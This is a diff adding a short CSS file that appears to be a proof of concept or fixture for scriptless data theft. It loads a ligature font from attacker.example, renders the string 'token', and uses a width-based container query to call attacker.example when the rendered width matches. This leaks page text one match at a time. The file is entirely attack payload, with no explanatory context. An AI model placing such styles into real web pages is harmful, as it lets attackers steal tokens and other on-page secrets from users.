@@ -1,0 +1,24 @@
+@font-face {
+  font-family: "BoundedLigatureLeak";
+  src: url("https://attacker.example/bounded-ligature.woff2");
+  unicode-range: U+0061-007A;
+}
+
+.ligature-source {
+  font-family: "BoundedLigatureLeak";
+  font-feature-settings: "liga" 1, "calt" 1;
+  font-variant-ligatures: common-ligatures discretionary-ligatures;
+  width: fit-content;
+  white-space: pre;
+}
+
+.ligature-source::before {
+  font-family: "BoundedLigatureLeak";
+  content: "token";
+}
+
+@container (width: 16px) {
+  .ligature-source::after {
+    content: url("https://attacker.example/bounded-ligature-hit");
+  }
+}
